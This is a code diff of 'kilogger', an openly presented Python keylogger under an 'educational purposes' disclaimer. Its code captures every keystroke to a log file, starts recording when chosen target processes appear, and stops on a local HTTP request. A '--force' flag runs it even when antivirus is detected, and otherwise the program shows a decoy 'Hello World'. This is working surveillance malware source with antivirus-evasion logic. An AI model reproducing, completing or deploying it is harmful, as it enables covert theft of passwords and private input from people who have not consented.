@@ -1,12 +1,34 @@
 """
+kilogger: A Keylogger Utility for Educational Purposes
+
+Functionalities:
+- Capture and log pressed keys.
+- Watch processes to trigger keylogger.
+- Log clipboard data.
+- Stop logger with an HTTP request.
+
+Disclaimer:
+kilogger is intended for educational purposes only. It is not designed for malicious use or unauthorized access.
+By using this project, you agree to use it responsibly and ethically. The developers of this project are not
+responsible for any misuse of this tool, and users are responsible for their actions. This project is provided
+"as is" without warranties. Use with explicit consent and respect for privacy.
+
+Author: Antonino Lorenzo
+Version: 1.0.0
+
+
 TODO [x]: stop logging when target is closed
 TODO [ ]: Work on logging format
     what should be the output? (ex. date - running targets - input)
     can the output be buffered?
+TODO [x]: debug ListenerSocket
+TODO [ ]: fix pylint
+TODO [x]: fix pycharm
+TODO [x]: complete docs in code
 TODO [ ]: Implement capture copy to clipboard functionality
 """
+
 import sys
-import threading
 import time
 import socket
 import argparse
@@ -20,6 +42,7 @@ from kilogger import (
     verify_package_installation
 )
 
+#  Import/Install dependencies
 try:
     import psutil
 except ImportError:
@@ -47,22 +70,25 @@ class StringToList(argparse.Action):
         setattr(namespace, self.dest, values)
 
 
-class KLogger(threading.Thread):
+class KLogger(Thread):
     """Wrapper around pynput.keyboard.Listener"""
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
-        self.__k_listener = Listener(on_press=KLogger._on_click)
+        self.__k_listener = Listener(on_press=KLogger._action)
         self.__k_listener.daemon = True
 
     def run(self):
+        """Run KLogger daemon"""
         self.__k_listener.start()
 
     def stop(self):
+        """Stop KLogger daemon"""
         self.__k_listener.stop()
 
     @staticmethod
-    def _on_click(key):
+    def _action(key):
+        """Called by pynput.keyboard.Listener when a button is pressed"""
         logging.info(str(key))
 
 
@@ -72,11 +98,13 @@ class KLoggerFactory:
         self.__current: KLogger | None = None
 
     def start(self):
+        """Starts a new KLogger thread"""
         if not self.__current:
             self.__current = KLogger()
             self.__current.start()
 
     def stop(self):
+        """Stops the current running KLogger thread"""
         if self.__current:
             self.__current.stop()
             self.__current = None
@@ -102,6 +130,7 @@ class ProcessListener(Thread):
         self.daemon = True
 
     def find_process(self):
+        """Updates the status [RUNNING, NOT_RUNNING] of the target processes"""
         snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
         for t in self.__targets.keys():
             if t in snapshot:
@@ -110,6 +139,7 @@ class ProcessListener(Thread):
                 self.__targets[t] = ProcessListener.NOT_RUNNING
 
     def run(self):
+        """"""
         while True:
             self.find_process()
             active_count = 0
@@ -119,6 +149,7 @@ class ProcessListener(Thread):
                 if s == ProcessListener.RUNNING:
                     active_count += 1
 
+                # found target process in running processes => start logging
                 if s == ProcessListener.RUNNING and self.__logger_status == ProcessListener.NOT_RUNNING:
                     self.__logger_status = ProcessListener.RUNNING
                     self.__logger_factory.start()
@@ -129,6 +160,7 @@ class ProcessListener(Thread):
             time.sleep(self.__sleep)
 
     def stop(self):
+        """Called when the termination signal is sent to ListenerSocket."""
         if self.__logger_status == ProcessListener.RUNNING:
             self.__logger_factory.stop()
         self.__stop_event.set()
@@ -148,29 +180,42 @@ class ListenerSocket:
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__sock.bind((ListenerSocket.HOST, ListenerSocket.PORT))
         self.__sock.listen()
-        conn, addr = self.__sock.accept()
-        self.handle(conn, addr)
+        self.__running = True
+
+        while self.__running:
+            conn, addr = self.__sock.accept()
+            self.handle(conn, addr)
 
     def handle(self, conn, addr):
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
+        """
+        Responsible for parsing requests, there are two possible outcomes:
+        - A request made to any path different to /terminate has no return.
+        - A request made to /terminate stops process listener and socket.
+        """
+        try:
+            while True:
+                data = conn.recv(1024)
+                if not data:
+                    break
 
-            request = data.decode('utf-8')
-            request_line, headers = request.split('\r\n', 1)
-            if ProcessListener.STOP in request_line:
-                self.__process_listener.stop()
-                message = 'Closed'
-                response = (f"HTTP/1.1 200 OK\r\n"
-                            f"Content-Type: text/plain\r\n"
-                            f"Content-Length: {len(message)}\r\n\r\n{message}")
-                conn.send(response.encode('utf-8'))
-                conn.close()
-                self.__sock.close()
-                break
-            else:
-                conn.close()
+                request = data.decode('utf-8')
+                request_line, headers = request.split('\r\n', 1)
+                if ProcessListener.STOP in request_line:
+                    self.__process_listener.stop()
+                    message = 'Closed'
+                    response = (f"HTTP/1.1 200 OK\r\n"
+                                f"Content-Type: text/plain\r\n"
+                                f"Content-Length: {len(message)}\r\n\r\n{message}")
+                    conn.send(response.encode('utf-8'))
+                    conn.close()
+                    if self.__sock:
+                        self.__running = False
+                        self.__sock.close()
+                    break
+                else:
+                    conn.close()
+        except OSError:
+            pass  # skip requests to paths that aren't /terminate
 
 
 def friendly_check():
@@ -202,16 +247,16 @@ def friendly_check():
 
 def main():
     # --- Setup argparse
-    PARSER = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser()
 
-    PARSER.add_argument(
+    parser.add_argument(
         '--force',
         type=int, choices=[0, 1],
         default=None,
         help='0: do not force logger if AV is on. 1: fuck it'
     )
 
-    PARSER.add_argument(
+    parser.add_argument(
         '--targets',
         action=StringToList,
         default=[],
@@ -220,19 +265,10 @@ def main():
         'note: process names should be separated by ", ".'
     )
 
-    args = PARSER.parse_args()
+    args = parser.parse_args()
     if (not (args.force and args.force == 1)) and friendly_check():  # big brain time
         print('Hello World')
     else:
-        try:
-            from pynput.keyboard import Listener
-        except ImportError:
-            install_package('pynput')
-            if not verify_package_installation('pynput'):
-                sys.exit(1)
-            else:
-                from pynput.keyboard import Listener
-
         logging.basicConfig(filename=LOGLOC, level=logging.DEBUG)
 
         # --- Run logger
